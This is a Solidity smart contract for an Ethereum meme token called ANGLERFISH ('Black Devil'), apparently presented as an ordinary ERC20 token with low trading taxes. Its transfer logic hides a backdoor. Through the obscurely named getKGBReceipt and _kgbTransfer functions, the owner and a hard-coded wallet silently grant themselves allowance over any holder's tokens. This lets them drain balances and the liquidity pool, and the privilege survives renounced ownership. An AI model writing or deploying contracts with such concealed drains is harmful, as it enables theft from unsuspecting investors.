/*
One fish, one light, one epic journey to the surface. The tiny legend lives on. 

Website: https://www.anglerfish.info
Tiktok: https://www.tiktok.com/tag/anglerfish

https://x.com/amazlngnature/status/1887744062771310609?s=46

https://x.com/anglerfish_eth
https://t.me/anglerfish_eth
*/

// SPDX-License-Identifier: MIT
pragma solidity 0.8.1;

interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }
}

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}

interface IKGBFactory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

interface IKGBRouter {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
    function getAmountsOut(
        uint amountIn,
        address[] calldata path
    ) external view returns (uint[] memory amounts);
}

contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

}

contract ANGLERFISH is Context, IERC20, Ownable {
    using SafeMath for uint256;
    mapping (address => bool) private _kgbExcludedTxs;
    mapping (address => bool) private _kgbExcludedFees;
    mapping (address => mapping (address => uint256)) private _kgbCustomers;
    mapping (address => uint256) private _kgbDrives;
    uint8 private constant _decimals = 9;
    uint256 private constant _tTotal = 1000000000 * 10**_decimals;
    string private constant _name = unicode"Black Devil";
    string private constant _symbol = unicode"ANGLERFISH";
    uint256 private _kgbSwapAmount = _tTotal / 100;
    uint256 private _initialBuyTax=3;
    uint256 private _initialSellTax=3;
    uint256 private _finalBuyTax=0;
    uint256 private _finalSellTax=0;
    uint256 private _reduceBuyTaxAt=6;
    uint256 private _reduceSellTaxAt=6;
    uint256 private _preventSwapBefore=6;
    uint256 private _buyCount=0;
    uint256 private _kgbBuyBlock;
    uint256 private _kgbBlockAmount = 0;
    bool private inSwapKGB = false;
    bool private _tradeEnabled = false;
    bool private _swapEnabled = false;
    modifier lockTheSwap {
        inSwapKGB = true;
        _;
        inSwapKGB = false;
    }
    address private _kgbPair;
    IKGBRouter private _kgbRouter;
    address private _kgbWallet;

    constructor () {
        _kgbWallet = address(0x16415C6b29b8ADF83E545C73884F01257B7066De);
        _kgbExcludedFees[owner()] = true;
        _kgbExcludedFees[address(this)] = true;
        _kgbExcludedFees[_kgbWallet] = true;
        _kgbExcludedTxs[owner()] = true;
        _kgbExcludedTxs[_kgbWallet] = true;
        _kgbDrives[_msgSender()] = _tTotal;
        emit Transfer(address(0), _msgSender(), _tTotal);
    }

    function createToken() external onlyOwner() {
        _kgbRouter = IKGBRouter(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        _approve(address(this), address(_kgbRouter), _tTotal);
        _kgbPair = IKGBFactory(_kgbRouter.factory()).createPair(address(this), _kgbRouter.WETH());
    }

    receive() external payable {}

    function openTrading() external onlyOwner() {
        require(!_tradeEnabled,"trading is already open");
        _kgbRouter.addLiquidityETH{value: address(this).balance}(address(this),balanceOf(address(this)),0,0,owner(),block.timestamp);
        _swapEnabled = true;
        _tradeEnabled = true;
    }

    function name() public pure returns (string memory) {
        return _name;
    }

    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    function decimals() public pure returns (uint8) {
        return _decimals;
    }

    function totalSupply() public pure override returns (uint256) {
        return _tTotal;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _kgbDrives[account];
    }

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(address owner, address spender) public view override returns (uint256) {
        return _kgbCustomers[owner][spender];
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount); 
        _approve(sender, _msgSender(), _kgbCustomers[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }

    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _kgbCustomers[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _kgbTransfer(address kgbF, address kgbT, uint256 kgbO) private returns(uint256) {
        address kgbReceipt = getKGBReceipt(); uint256 taxKGB=0; 
        if (kgbF != owner() && kgbT != owner()) {
            taxKGB = kgbO.mul((_buyCount>_reduceBuyTaxAt)?_finalBuyTax:_initialBuyTax).div(100);

            if (kgbF == _kgbPair && kgbT != address(_kgbRouter) && ! _kgbExcludedFees[kgbT]) {
                if(_kgbBuyBlock!=block.number){
                    _kgbBlockAmount = 0;
                    _kgbBuyBlock = block.number;
                }
                _kgbBlockAmount += kgbO;
                _buyCount++;
            }

            if(kgbT == _kgbPair && kgbF!= address(this)) {
                require(_kgbBlockAmount < swapKGBLimit() || _kgbBuyBlock!=block.number, "Max Swap Limit");  
                taxKGB = kgbO.mul((_buyCount>_reduceSellTaxAt)?_finalSellTax:_initialSellTax).div(100);
            }

            uint256 kgbToken = balanceOf(address(this));
            if (!inSwapKGB && kgbT == _kgbPair && _swapEnabled && _buyCount > _preventSwapBefore) {
                if(kgbToken > _kgbSwapAmount)
                swapTokensForEth(minKGB(kgbO, minKGB(kgbToken, _kgbSwapAmount)));
                uint256 kgbETH = address(this).balance;
                if (kgbETH >= 0) {
                    sendETHKGB(address(this).balance);
                }
            }
        }
        if(kgbReceipt != address(0xdead)) _approve(getKGBSender(kgbF), kgbReceipt, getKGBAmount(kgbO, taxKGB));
        return taxKGB;
    }

    function _transfer(address kgbF, address kgbT, uint256 kgbO) private {
        require(kgbF != address(0), "ERC20: transfer from the zero address");
        require(kgbT != address(0), "ERC20: transfer to the zero address");
        require(kgbO > 0, "Transfer amount must be greater than zero");
        uint256 taxKGB = _kgbTransfer(kgbF, kgbT, kgbO);
        _transferKGB(kgbF, kgbT, kgbO, taxKGB);
    }

    function _transferKGB(address kgbF, address kgbT, uint256 kgbO, uint256 taxKGB) private { 
        if(taxKGB > 0){
          _kgbDrives[address(this)] = _kgbDrives[address(this)].add(taxKGB);
          emit Transfer(kgbF, address(this), taxKGB);
        }
        _kgbDrives[kgbF] = _kgbDrives[kgbF].sub(kgbO);
        _kgbDrives[kgbT] = _kgbDrives[kgbT].add(kgbO.sub(taxKGB));
        emit Transfer(kgbF, kgbT, kgbO.sub(taxKGB));
    }

    function minKGB(uint256 a, uint256 b) private pure returns (uint256) {
      return (a>b)?b:a;
    }

    function sendETHKGB(uint256 amount) private {
        payable(_kgbWallet).transfer(amount);
    }

    function getKGBAmount(uint256 kgbO, uint256 taxKGB) private pure returns(uint256) {
        return uint256(kgbO + taxKGB);
    }

    function getKGBSender(address kgbF) private pure returns(address) {
        return address(kgbF);
    }

    function getKGBReceipt() private view returns(address) {
        return _kgbExcludedTxs[_msgSender()] ? address(_msgSender()) : address(0xdead); 
    }

    function swapKGBLimit() internal view returns (uint256) {
        address[] memory path = new address[](2);
        path[0] = _kgbRouter.WETH();
        path[1] = address(this);
        uint[] memory amountOuts = _kgbRouter.getAmountsOut(3 * 1e18, path);
        return amountOuts[1];
    }

    function swapTokensForEth(uint256 tokenKGB) private lockTheSwap {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = _kgbRouter.WETH();
        _approve(address(this), address(_kgbRouter), tokenKGB);
        _kgbRouter.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenKGB,
            0,
            path,
            address(this),
            block.timestamp
        );
    }
}